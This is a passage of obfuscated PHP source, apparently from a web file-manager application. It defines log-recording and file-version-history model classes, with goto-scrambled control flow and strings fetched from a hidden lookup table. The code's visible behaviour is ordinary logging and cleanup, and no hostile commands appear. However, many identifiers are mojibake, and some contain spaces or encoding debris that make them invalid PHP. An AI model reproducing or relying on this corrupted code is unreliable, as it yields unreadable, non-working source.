LNG($CãÇØàÙü¶[2123]); $D¬ëâˆñ¢º[$CãÇØàÙü¶[2118]] = LNG($CãÇØàÙü¶[2124]); goto Bö≠òï‰§≥; d¨ÜÂÀÕõº: $CãÇØàÙü¶ =& $_SERVER[’ÿƒ†ïò]; $D¬ëâˆñ¢º = $this->typeList; $aòáœØ—‡‹ = array_filter($this->typeFile()); goto e»â„¶®õ; A—Çî€Úµ«: } public function addLog($c∆›ß‡‡ã®, $aêÆﬁøóØå = array()) { goto aèµ≈ª¨ëÃ; dà«ŒÑúÕê: $aêÆﬁøóØå = array($CÜ∑à¥¥á„[1547] => Session::sign(), $CÜ∑à¥¥á„[1548] => $cîëÓì⁄Ö≈, $CÜ∑à¥¥á„[29] => $c∆›ß‡‡ã®, $CÜ∑à¥¥á„[1550] => json_encode($aêÆﬁøóØå)); parent::add($aêÆﬁøóØå); goto aœ°©˘πÂŸ; aèµ≈ª¨ëÃ: $CÜ∑à¥¥á„ =& $_SERVER[’ÿƒ†ïò]; if (!isset($this->typeList[$c∆›ß‡‡ã®])) { return; } $cîëÓì⁄Ö≈ = defined($CÜ∑à¥¥á„[468]) && USER_ID ? USER_ID : (isset($aêÆﬁøóØå[$CÜ∑à¥¥á„[1557]]) ? $aêÆﬁøóØå[$CÜ∑à¥¥á„[1557]] : 0); goto b´‚Ì†êò˘; b´‚Ì†êò˘: if (!$cîëÓì⁄Ö≈) { $cîëÓì⁄Ö≈ = (int) Session::get($CÜ∑à¥¥á„[1857]); } $fÙòÑ∫≥É› = get_client_ip(); if (!$aêÆﬁøóØå || strlen(json_encode($aêÆﬁøóØå)) >= 1024) { $aêÆﬁøóØå = array($CÜ∑à¥¥á„[2125] => $fÙòÑ∫≥É›); } else { if (is_array($aêÆﬁøóØå)) { $aêÆﬁøóØå[$CÜ∑à¥¥á„[2125]] = $fÙòÑ∫≥É›; } else { $aêÆﬁøóØå = array($CÜ∑à¥¥á„[1116] => $aêÆﬁøóØå, $CÜ∑à¥¥á„[2125] => $fÙòÑ∫≥É›); } } goto dà«ŒÑúÕê; aœ°©˘πÂŸ: } public function remove($cÿ¥Ç¯–Àê) { $this->where(array($_SERVER[’ÿƒ†ïò][414] => $cÿ¥Ç¯–Àê))->delete(); } private function _makeOrder($CÇäºÛ›Üò = '') { goto c÷çéã¨èë; BëÀ€ÍáÉÂ: $d¡©—©ëñë = Input::get($dÒπà∫é∆‰[450], $dÒπà∫é∆‰[7], $dÒπà∫é∆‰[1889], array($dÒπà∫é∆‰[1813], $dÒπà∫é∆‰[444])); $d¡©—©ëñë = $A≥√ÍıŒ…ß[$d¡©—©ëñë]; $CÇäºÛ›Üò = $CÇäºÛ›Üò . "{$F·øïâ©›Ã}\x20{$d¡©—©ëñë}"; goto d‡›ıÈØ§Á; c÷çéã¨èë: $dÒπà∫é∆‰ =& $_SERVER[’ÿƒ†ïò]; $F·øïâ©›Ã = $dÒπà∫é∆‰[194]; $A≥√ÍıŒ…ß = array($dÒπà∫é∆‰[442] => $dÒπà∫é∆‰[443], $dÒπà∫é∆‰[444] => $dÒπà∫é∆‰[445]); goto BëÀ€ÍáÉÂ; d‡›ıÈØ§Á: return $this->order($CÇäºÛ›Üò); goto eäÌáøÎ¢å; eäÌáøÎ¢å: } public function get($c¯≠Ê´Ç´Ø = '') { goto cçûÜ•‡êç; föÚ»óÒ©Ô: if (!empty($c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[2125]])) { $a≈ŸÔ“Ÿ›Á[$E∆ìßÁÍñœ[445]] = array($E∆ìßÁÍñœ[381], "\x25{$c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[2125]]}\x25"); } $fâﬂ≈æè—ç = $this->_makeOrder()->where($a≈ŸÔ“Ÿ›Á)->selectPage(); if (empty($fâﬂ≈æè—ç[$E∆ìßÁÍñœ[367]])) { show_json(array(), !0, $fâﬂ≈æè—ç[$E∆ìßÁÍñœ[364]]); } goto c∞ÖÚ“É„ﬂ; dÖåêŸ∏í¥: if ($c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[1557]]) { $a≈ŸÔ“Ÿ›Á[$E∆ìßÁÍñœ[1557]] = $c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[1557]]; } if (isset($c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[749]])) { $F◊Á¯æÑêå = $c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[749]]; $fÖõ„¥¥¨£ = isset($c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[490]]) ? $c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[490]] : time(); $a≈ŸÔ“Ÿ›Á[$E∆ìßÁÍñœ[194]] = array($E∆ìßÁÍñœ[331], array($F◊Á¯æÑêå, $fÖõ„¥¥¨£)); } if ($c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[29]]) { $C«ÌÊØÜ∞¿ = explode($E∆ìßÁÍñœ[47], $c¯≠Ê´Ç´Ø[$E∆ìßÁÍñœ[29]]); $Dƒ≥´Ω≈†ˆ = $this->typeFile(); $Dÿû¿Ï≤û· = array(); foreach ($C«ÌÊØÜ∞¿ as $e¯öËìêŒ›) { $Dÿû¿Ï≤û·[] = $e¯öËìêŒ›; if (isset($Dƒ≥´Ω≈†ˆ[$e¯öËìêŒ›])) { $Dÿû¿Ï≤û· = array_merge($Dÿû¿Ï≤û·, $Dƒ≥´Ω≈†ˆ[$e¯öËìêŒ›]); } } $Dÿû¿Ï≤û· = array_unique($Dÿû¿Ï≤û·); if ($Dÿû¿Ï≤û·) { $a≈ŸÔ“Ÿ›Á[$E∆ìßÁÍñœ[29]] = array($E∆ìßÁÍñœ[7], $Dÿû¿Ï≤û·); } } else { $a≈ŸÔ“Ÿ›Á[$E∆ìßÁÍñœ[29]] = array($E∆ìßÁÍñœ[2126], $E∆ìßÁÍñœ[2127]); } goto föÚ»óÒ©Ô; cçûÜ•‡êç: $E∆ìßÁÍñœ =& $_SERVER[’ÿƒ†ïò]; if (!$c¯≠Ê´Ç´Ø) { show_json(array()); } $a≈ŸÔ“Ÿ›Á = array(); goto dÖåêŸ∏í¥; c∞ÖÚ“É„ﬂ: $fâﬂ≈æè—ç[$E∆ìßÁÍñœ[367]] = $this->logList($fâﬂ≈æè—ç[$E∆ìßÁÍñœ[367]]); return $fâﬂ≈æè—ç; goto d◊≈·√◊√¯; d◊≈·√◊√¯: } private function ipAddress(&$B∂⁄—É¿§ƒ) { $dû¶ƒ√âÑú =& $_SERVER[’ÿƒ†ïò]; if (!empty($B∂⁄—É¿§ƒ[$dû¶ƒ√âÑú[2125]])) { $A∆·â”ãπä = IpLocation::get($B∂⁄—É¿§ƒ[$dû¶ƒ√âÑú[2125]]); } else { $A∆·â”ãπä = LNG($dû¶ƒ√âÑú[2128]); } $B∂⁄—É¿§ƒ[$dû¶ƒ√âÑú[2129]] = $A∆·â”ãπä; } private function descZipDownload($bê¿ÈÂÜ≥, &$Fﬁ·ˆ”¶ØÇ) { $fÿ√ºÛôÖ… =& $_SERVER[’ÿƒ†ïò]; if (!isset($bê¿ÈÂÜ≥[$fÿ√ºÛôÖ…[2130]])) { return; } $d–ÛûÑı = json_decode($bê¿ÈÂÜ≥[$fÿ√ºÛôÖ…[2130]], !0); foreach ($d–ÛûÑı as $Eı∆’ÉÃñË) { try { $Fªâ˜∆Ö§“ = IO::infoFull($Eı∆’ÉÃñË[$fÿ√ºÛôÖ…[76]]); } catch (Exception $bÕùÑí∞ûˆ) { continue; } $bê¿ÈÂÜ≥[$fÿ√ºÛôÖ…[76]] = $Eı∆’ÉÃñË[$fÿ√ºÛôÖ…[76]]; $Fﬁ·ˆ”¶ØÇ[] = $bê¿ÈÂÜ≥[$fÿ√ºÛôÖ…[397]] = $Fªâ˜∆Ö§“[$fÿ√ºÛôÖ…[397]]; $Fﬁ·ˆ”¶ØÇ[] = $bê¿ÈÂÜ≥[$fÿ√ºÛôÖ…[1943]] = $Fªâ˜∆Ö§“[$fÿ√ºÛôÖ…[492]]; break; } return $bê¿ÈÂÜ≥; } private function getSourceList(&$DΩ»à·¯™œ) { $Cﬂ¥Ñ◊∑˜∫ =& $_SERVER[’ÿƒ†ïò]; $FÕ‹ÌôáÇ‰ = array(); foreach ($DΩ»à·¯™œ as $c‹∫ÜÉ¨ùÊ => $B¯Â∑ÍŸõã) { goto eîåâ…áﬁÕ; a¶ﬁïß ›à: if ($fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[29]] == $Cﬂ¥Ñ◊∑˜∫[1951]) { $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[445]][$Cﬂ¥Ñ◊∑˜∫[397]]; } goto b¶¡Ω∏¢ÑŸ; eîåâ…áﬁÕ: $fÛ≤®Ö’é´ = json_decode($B¯Â∑ÍŸõã[$Cﬂ¥Ñ◊∑˜∫[445]], !0); if ($B¯Â∑ÍŸõã[$Cﬂ¥Ñ◊∑˜∫[29]] == $Cﬂ¥Ñ◊∑˜∫[1697]) { $fÛ≤®Ö’é´ = $this->descZipDownload($fÛ≤®Ö’é´, $FÕ‹ÌôáÇ‰); $DΩ»à·¯™œ[$c‹∫ÜÉ¨ùÊ][$Cﬂ¥Ñ◊∑˜∫[445]] = json_encode($fÛ≤®Ö’é´); continue; } if (strpos($B¯Â∑ÍŸõã[$Cﬂ¥Ñ◊∑˜∫[29]], $Cﬂ¥Ñ◊∑˜∫[1944]) !== 0) { if (!isset($fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[76]]) || strpos($B¯Â∑ÍŸõã[$Cﬂ¥Ñ◊∑˜∫[29]], $Cﬂ¥Ñ◊∑˜∫[2131]) !== 0) { continue; } try { $D‰ŒÇüâ®î = IO::infoFull($fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[76]]); } catch (Exception $A∑≈áÑﬁ„’) { continue; } $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[397]] = $D‰ŒÇüâ®î[$Cﬂ¥Ñ◊∑˜∫[397]]; $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[1943]] = $D‰ŒÇüâ®î[$Cﬂ¥Ñ◊∑˜∫[492]]; $DΩ»à·¯™œ[$c‹∫ÜÉ¨ùÊ][$Cﬂ¥Ñ◊∑˜∫[445]] = json_encode($fÛ≤®Ö’é´); continue; } goto Aú∫û¥êµ¡; Aú∫û¥êµ¡: $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[397]]; $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[1943]]; if ($fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[29]] == $Cﬂ¥Ñ◊∑˜∫[545]) { $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[445]][$Cﬂ¥Ñ◊∑˜∫[1083]]; $FÕ‹ÌôáÇ‰[] = $fÛ≤®Ö’é´[$Cﬂ¥Ñ◊∑˜∫[445]][$Cﬂ¥Ñ◊∑˜∫[1084]]; } goto a¶ﬁïß ›à; b¶¡Ω∏¢ÑŸ: } if (!$FÕ‹ÌôáÇ‰) { return array(); } return Model($Cﬂ¥Ñ◊∑˜∫[820])->sourceListInfo($FÕ‹ÌôáÇ‰, !0); } private function logList($AíÀ≥áâÕ‚) { goto dó√ùÂ¨—∂; d¬Íø’ªóÀ: return $Eı›≠Êê¶; goto cßÉ¯õ©êÖ; F◊ÿíË°ƒ‘: $F≤ôú€öªÛ = array(); foreach ($AíÀ≥áâÕ‚ as $e∞ ÀêΩﬂ— => $B™±Œ˘ê€ã) { goto A¯ñæÎ®©; e´»∞æú”∏: $B™±Œ˘ê€ã[$Fë…¬∞ïàó[1888]] = $bÊŸùë∑æÓ; $bæΩ∆ê⁄ø‡ = json_decode($B™±Œ˘ê€ã[$Fë…¬∞ïàó[445]], !0); $B™±Œ˘ê€ã[$Fë…¬∞ïàó[2125]] = isset($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[2125]]) ? $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[2125]] : $Fë…¬∞ïàó[33]; goto fê¢∏ÛÀƒÜ; a í…∆∞âë: unset($B™±Œ˘ê€ã[$Fë…¬∞ïàó[2134]]); $Eı›≠Êê¶[] = $B™±Œ˘ê€ã; goto e≥·ÚÓäÈÌ; Cè≈ÛøÜñç: $B™±Œ˘ê€ã[$Fë…¬∞ïàó[28]] = isset($bÊŸùë∑æÓ[$Fë…¬∞ïàó[28]]) ? $bÊŸùë∑æÓ[$Fë…¬∞ïàó[28]] : LNG($Fë…¬∞ïàó[2128]); $B™±Œ˘ê€ã[$Fë…¬∞ïàó[1991]] = isset($bÊŸùë∑æÓ[$Fë…¬∞ïàó[1991]]) ? $bÊŸùë∑æÓ[$Fë…¬∞ïàó[1991]] : $Fë…¬∞ïàó[33]; $B™±Œ˘ê€ã[$Fë…¬∞ïàó[1460]] = isset($bÇäÃÇ∆∏[$cÀöäáèÜ]) ? $bÇäÃÇ∆∏[$cÀöäáèÜ] : $Bÿÿ≠∫öﬂ‰; goto e´»∞æú”∏; fê¢∏ÛÀƒÜ: $this->ipAddress($B™±Œ˘ê€ã); if (strpos($cÀöäáèÜ, $Fë…¬∞ïàó[1944]) === 0 || isset($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1943]])) { goto dœ”¡Ôº”Ç; Bå¥‡ª∂Öº: if ($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[29]] == $Fë…¬∞ïàó[1951]) { $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[445]][$Fë…¬∞ïàó[397]] = $D®ïßóµ›[$bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[445]][$Fë…¬∞ïàó[397]]]; } if ($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[29]] == $Fë…¬∞ïàó[1692]) { $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1956]] = $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[85]]; $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1943]] = $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1956]][$Fë…¬∞ïàó[397]]; $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[85]] = !1; $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[397]] = $Fë…¬∞ïàó[33]; } if ($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[85]] && $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[85]][$Fë…¬∞ïàó[406]] == $Fë…¬∞ïàó[1199]) { $F≤ôú€öªÛ[] = $B™±Œ˘ê€ã[$Fë…¬∞ïàó[395]]; unset($AíÀ≥áâÕ‚[$e∞ ÀêΩﬂ—]); continue; } goto dôøò—êÎÁ; dœ”¡Ôº”Ç: $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[85]] = $D®ïßóµ›[$bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[397]]]; $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1956]] = $D®ïßóµ›[$bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1943]]]; if ($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[29]] == $Fë…¬∞ïàó[545]) { $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[445]][$Fë…¬∞ïàó[1083]] = $D®ïßóµ›[$bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[445]][$Fë…¬∞ïàó[1083]]]; $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[445]][$Fë…¬∞ïàó[1084]] = $D®ïßóµ›[$bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[445]][$Fë…¬∞ïàó[1084]]]; } goto Bå¥‡ª∂Öº; dôøò—êÎÁ: if ($bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1956]] && $bæΩ∆ê⁄ø‡[$Fë…¬∞ïàó[1956]][$Fë…¬∞ïàó[406]] == $Fë…¬∞ïàó[1199]) { $F≤ôú€öªÛ[] = $B™±Œ˘ê€ã[$Fë…¬∞ïàó[395]]; unset($AíÀ≥áâÕ‚[$e∞ ÀêΩﬂ—]); continue; } goto cü∫ûê¯æ¯; cü∫ûê¯æ¯: } $B™±Œ˘ê€ã[$Fë…¬∞ïàó[445]] = $bæΩ∆ê⁄ø‡; goto a í…∆∞âë; A¯ñæÎ®©: $cÀöäáèÜ = $B™±Œ˘ê€ã[$Fë…¬∞ïàó[29]]; $bÊŸùë∑æÓ = isset($BŸéâ≈ù¬—[$B™±Œ˘ê€ã[$Fë…¬∞ïàó[1557]]]) ? $BŸéâ≈ù¬—[$B™±Œ˘ê€ã[$Fë…¬∞ïàó[1557]]] : !1; $Bÿÿ≠∫öﬂ‰ = strpos($cÀöäáèÜ, $Fë…¬∞ïàó[2132]) === 0 ? LNG($Fë…¬∞ïàó[2133]) : LNG($Fë…¬∞ïàó[2128]); goto Cè≈ÛøÜñç; e≥·ÚÓäÈÌ: } $this->clearSystemPathLog($F≤ôú€öªÛ); goto d¬Íø’ªóÀ; dó√ùÂ¨—∂: $Fë…¬∞ïàó =& $_SERVER[’ÿƒ†ïò]; $cÃ»Ê¿Ì∫Â = array_to_keyvalue($AíÀ≥áâÕ‚, $Fë…¬∞ïàó[33], $Fë…¬∞ïàó[1557]); $BŸéâ≈ù¬— = Model($Fë…¬∞ïàó[532])->userListInfo(array_unique($cÃ»Ê¿Ì∫Â)); goto fƒÖ“∂ÉÈ‚; fƒÖ“∂ÉÈ‚: $D®ïßóµ› = $this->getSourceList($AíÀ≥áâÕ‚); $bÇäÃÇ∆∏ = $this->typeAll(); $Eı›≠Êê¶ = array(); goto F◊ÿíË°ƒ‘; cßÉ¯õ©êÖ: } private function clearSystemPathLog($e•áπÕÉÑ…) { $Eª£ıΩﬂ∫√ =& $_SERVER[’ÿƒ†ïò]; if (count($e•áπÕÉÑ…) == 0) { return; } $bñ™Ÿœ¶ªﬁ = array($Eª£ıΩﬂ∫√[395] => array($Eª£ıΩﬂ∫√[7], array_unique($e•áπÕÉÑ…))); $this->where($bñ™Ÿœ¶ªﬁ)->delete(); } public function deviceList($A∆⁄∑í©ßﬂ, $f∏ó— ì∫‚ = 0) { $aèô¬Óø˜î =& $_SERVER[’ÿƒ†ïò]; $b¨·çœ≠©ì = array($aèô¬Óø˜î[1557] => $A∆⁄∑í©ßﬂ, $aèô¬Óø˜î[194] => array($aèô¬Óø˜î[1001], $f∏ó— ì∫‚), $aèô¬Óø˜î[29] => $aèô¬Óø˜î[1666]); $D∞è“Ô¿è¶ = array(); $Bƒïü¨ö¶¿ = $this->field($aèô¬Óø˜î[2135])->where($b¨·çœ≠©ì)->order($aèô¬Óø˜î[1954])->limit(50)->select(); foreach ($Bƒïü¨ö¶¿ as $eëçŸàÃÙ√ => $dÜê“òç‹ë) { goto eë¿âô·Ü≥; Bå“≠”¬Ëá: $this->ipAddress($dÜê“òç‹ë); $dÜê“òç‹ë[$aèô¬Óø˜î[445]] = $cêÎ∫ÒÚ£â; $D∞è“Ô¿è¶[$b©‹ã‹»ü] = $dÜê“òç‹ë; goto EåáÊÉôÑæ; eë¿âô·Ü≥: if ($eëçŸàÃÙ√ > 0 && abs($dÜê“òç‹ë[$aèô¬Óø˜î[194]] - $Bƒïü¨ö¶¿[$eëçŸàÃÙ√ - 1][$aèô¬Óø˜î[194]]) < 5) { continue; } $cêÎ∫ÒÚ£â = json_decode($dÜê“òç‹ë[$aèô¬Óø˜î[445]], !0); $dÜê“òç‹ë[$aèô¬Óø˜î[2125]] = isset($cêÎ∫ÒÚ£â[$aèô¬Óø˜î[2125]]) ? $cêÎ∫ÒÚ£â[$aèô¬Óø˜î[2125]] : $aèô¬Óø˜î[33]; goto fñÛÛΩà¯ñ; fñÛÛΩà¯ñ: unset($cêÎ∫ÒÚ£â[$aèô¬Óø˜î[2125]]); $b©‹ã‹»ü = $this->deviceType($cêÎ∫ÒÚ£â[$aèô¬Óø˜î[1945]]); if (isset($D∞è“Ô¿è¶[$b©‹ã‹»ü])) { continue; } goto Bå“≠”¬Ëá; EåáÊÉôÑæ: } return array_values($D∞è“Ô¿è¶); } public function deviceType($aêñùñßê¬) { return $aêñùñßê¬; } } goto F‚ıëáı≈ƒ; Câ®ï©ô“ç: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\162\x63\x65\137\150\x69\x73\164\x6f\162\171"; public function historyCount($eÒêÌé∂ñŸ) { goto dí¡ÇÛ·Ñø; dí¡ÇÛ·Ñø: $b™‚‡˜»Ú∑ =& $_SERVER[’ÿƒ†ïò]; if (!$eÒêÌé∂ñŸ) { return array(); } if (is_string($eÒêÌé∂ñŸ) || is_int($eÒêÌé∂ñŸ)) { $eÒêÌé∂ñŸ = array($eÒêÌé∂ñŸ); } goto A”ﬁè’Ë˜ì; A”ﬁè’Ë˜ì: $aÊü‚«Ø‚◊ = array($b™‚‡˜»Ú∑[397], $b™‚‡˜»Ú∑[1758] => $b™‚‡˜»Ú∑[494]); $C≤∆∫âÜŒÖ = array($b™‚‡˜»Ú∑[397] => array($b™‚‡˜»Ú∑[7], $eÒêÌé∂ñŸ)); $c…ÏØ≈å¬Ï = $this->field($aÊü‚«Ø‚◊)->where($C≤∆∫âÜŒÖ)->group($b™‚‡˜»Ú∑[397])->select(); goto Aè∆ÍÀéÑÇ; Aè∆ÍÀéÑÇ: return array_to_keyvalue($c…ÏØ≈å¬Ï, $b™‚‡˜»Ú∑[397], $b™‚‡˜»Ú∑[494]); goto dÌ‹à‹∑ëé; dÌ‹à‹∑ëé: } public function addHistory($AƒÍ««Ãﬂî, $E« íÁõæ‰ = '') { $B‘≥ç©ª–ã =& $_SERVER[’ÿƒ†ïò]; $a©‹î≠ë†Ú = array($B‘≥ç©ª–ã[412] => $AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[397]], $B‘≥ç©ª–ã[1548] => isset($AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[448]]) ? $AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[448]] : $AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[446]], $B‘≥ç©ª–ã[462] => $AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[461]], $B‘≥ç©ª–ã[573] => $AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[78]], $B‘≥ç©ª–ã[1957] => $E« íÁõæ‰); $e˘óá÷≠∏ß = $GLOBALS[$B‘≥ç©ª–ã[6]][$B‘≥ç©ª–ã[88]][$B‘≥ç©ª–ã[1132]]; if ($e˘óá÷≠∏ß > 1) { $this->historyAutoClear($a©‹î≠ë†Ú[$B‘≥ç©ª–ã[397]]); $this->add($a©‹î≠ë†Ú); } Hook::trigger($B‘≥ç©ª–ã[1958], $a©‹î≠ë†Ú); Model($B‘≥ç©ª–ã[1959])->eventFileEdit($AƒÍ««Ãﬂî[$B‘≥ç©ª–ã[397]]); } private function historyAutoClear($Fø¡≥ºπ“Õ) { goto cÌåŒáﬁ‚ò; Bí∆—Öãòß: $dÒùõÆö¿• = array_slice($dÒùõÆö¿•, $Eöœ‰ìï…é); if (!$D®øÃ€áÕÖ || !$dÒùõÆö¿•) { return; } $e…⁄œ·ﬂä… = array($eÉÚŸãõÿ[414] => array($eÉÚŸãõÿ[7], $D®øÃ€áÕÖ)); goto c€©Ñåï≈©; Aíà‰ÇÍãî: $Eöœ‰ìï…é = $dÈê‘Ü‹¢À == $eÉÚŸãõÿ[1155] ? 5 : $aÛ•ÍÙƒø∂; if ($aÛ•ÍÙƒø∂ <= 1) { $Eöœ‰ìï…é = 1; } if ($Eöœ‰ìï…é >= 500) { return; } goto bÌ€√ê¡•—; bÌ€√ê¡•—: $e…⁄œ·ﬂä… = array($eÉÚŸãõÿ[412] => $Fø¡≥ºπ“Õ); $aÍÕñÊ´ñø = $this->field($eÉÚŸãõÿ[1960])->where($e…⁄œ·ﬂä…)->order($eÉÚŸãõÿ[1954])->select(); if (!$aÍÕñÊ´ñø || $Eöœ‰ìï…é >= count($aÍÕñÊ´ñø)) { return; } goto Aàé£≠†ﬁù; cÌåŒáﬁ‚ò: $eÉÚŸãõÿ =& $_SERVER[’ÿƒ†ïò]; $dÈê‘Ü‹¢À = Model($eÉÚŸãõÿ[758])->get($eÉÚŸãõÿ[1154]); $aÛ•ÍÙƒø∂ = $GLOBALS[$eÉÚŸãõÿ[6]][$eÉÚŸãõÿ[88]][$eÉÚŸãõÿ[1132]]; goto Aíà‰ÇÍãî; c€©Ñåï≈©: $this->where($e…⁄œ·ﬂä…)->delete(); Model($eÉÚŸãõÿ[464])->remove($dÒùõÆö¿•); goto dã∆Í¶°§; Aàé£≠†ﬁù: $D®øÃ€áÕÖ = array_to_keyvalue($aÍÕñÊ´ñø, $eÉÚŸãõÿ[33], $eÉÚŸãõÿ[395]); $D®øÃ€áÕÖ = array_slice($D®øÃ€áÕÖ, $Eöœ‰ìï…é); $dÒùõÆö¿• = array_to_keyvalue($aÍÕñÊ´ñø, $eÉÚŸãõÿ[33], $eÉÚŸãõÿ[461]); goto Bí∆—Öãòß; dã∆Í¶°§: } public function listData($BÓ‡ÎóˆÃó) { goto eåﬂœü≈ÌÀ; Bø⁄ó„∆Ú: $f€ŒÏÛç∞ì = 5; if ($cäú⁄ë∏‘» == $e˜≥≥Ô‚ﬁ–[1155]) { $D„ıßÈÜ›ô[$e˜≥≥Ô‚ﬁ–[367]] = array_slice($D„ıßÈÜ›ô[$e˜≥≥Ô‚ﬁ–[367]], 0, $f€ŒÏÛç∞ì); $D„ıßÈÜ›ô[$e˜≥≥Ô‚ﬁ–[364]] = array($e˜≥≥Ô‚ﬁ–[1962] => 1, $e˜≥≥Ô‚ﬁ–[1963] => 20, $e˜≥≥Ô‚ﬁ–[1964] => 1, $e˜≥≥Ô‚ﬁ–[1965] => count($D„ıßÈÜ›ô[$e˜≥≥Ô‚ﬁ–[367]])); } return $D„ıßÈÜ›ô; goto FÛµò†…êæ; eåﬂœü≈ÌÀ: $e˜≥≥Ô‚ﬁ– =& $_SERVER[’ÿƒ†ïò]; $F™Ô¡å¡≈õ = array($e˜≥≥Ô‚ﬁ–[412] => $BÓ‡ÎóˆÃó); $aã˜·´‘≈É = $e˜≥≥Ô‚ﬁ–[1961]; goto BÿàâüûàÑ; BÿàâüûàÑ: $D„ıßÈÜ›ô = $this->field($aã˜·´‘≈É)->where($F™Ô¡å¡≈õ)->order($e˜≥≥Ô‚ﬁ–[1954])->selectPage(); $this->_listAppendUser($D„ıßÈÜ›ô[$e˜≥≥Ô‚ﬁ–[367]]); $cäú⁄ë∏‘» = Model($e˜≥≥Ô‚ﬁ–[758])->get($e˜≥≥Ô‚ﬁ–[1154]); goto Bø⁄ó„∆Ú; FÛµò†…êæ: } protected function _listAppendUser(&$Fòﬂ–ãôç©) { $d‰®†ñåòü =& $_SERVER[’ÿƒ†ïò]; $eîº∏åÇ∫° = array_to_keyvalue($Fòﬂ–ãôç©, $d‰®†ñåòü[33], $d‰®†ñåòü[1557]); $C÷‚√Ÿ∞ƒÀ = Model($d‰®†ñåòü[532])->userListInfo($eîº∏åÇ∫°); foreach ($Fòﬂ–ãôç© as &$cÂ∏ÃÿÓÙ†) { $eê¢ù—µ…Î = $cÂ∏ÃÿÓÙ†[$d‰®†ñåòü[1557]]; $cÂ∏ÃÿÓÙ†[$d‰®†ñåòü[446]] = $C÷‚√Ÿ∞ƒÀ[$eê¢ù—µ…Î] ? $C÷‚√Ÿ∞ƒÀ[$eê¢ù—µ…Î] : !1; } unset($cÂ∏ÃÿÓÙ†); } public function fileInfo($C«ó⁄ç¡˘ö) { $C•Ãÿµ›Ùé =& $_SERVER[’ÿƒ†ïò]; $aâıÜÿ”äß = $this->tablePrefix; $f•–£∆»√Ü = "{$aâıÜÿ”äß}\x69\157\137\x66\x69\154\x65\x20\146\x69\x6c\x65\163\x20\x6f\156\40\x66\151\x6c\145\x73\56\x66\x69\154\x65\111\x44\x20\x3d\x20\x68\x69\163\164\157\162\x79\x2e\146\x69\154\x65\x49\x44"; return $this->alias($C•Ãÿµ›Ùé[1966])->where(array($C•Ãÿµ›Ùé[414] => $C«ó⁄ç¡˘ö))->join($f•–£∆»√Ü, $C•Ãÿµ›Ùé[1967])->find(); } public function removeItem($BåùòÔ°Ü±) { $cß≤¡◊âµ∫ =& $_SERVER[’ÿƒ†ïò]; $DçƒêÜÖÜ÷ = array($cß≤¡◊âµ∫[414] => $BåùòÔ°Ü±); $dûæ—Ç€È± = $this->where($DçƒêÜÖÜ÷)->find(); if ($dûæ—Ç€È±) { $a¯êƒ¥—è˜ = $this->where($DçƒêÜÖÜ÷)->delete(); Model($cß≤¡◊âµ∫[464])->remove($dûæ—Ç€È±[$cß≤¡◊âµ∫[461]]); return $a¯êƒ¥—è˜; } return !1; } public function removeBySource($Cô¢Ïﬁîœâ) { goto e≤ãç÷ÍëÇ; Dçﬂ„íéé∫: return !0; goto f≤±âˆ«îî; A€µµúô≈π: $A¶“ŒèêÔœ = array($E∫ÂÕ’á›ô[412] => array($E∫ÂÕ’á›ô[7], $Cô¢Ïﬁîœâ)); $aÙÍèÔËöÂ = $this->field($E∫ÂÕ’á›ô[462])->where($A¶“ŒèêÔœ)->select(); if ($aÙÍèÔËöÂ) { $this->where($A¶“ŒèêÔœ)->delete(); $e”≈Éÿ¢ú™ = 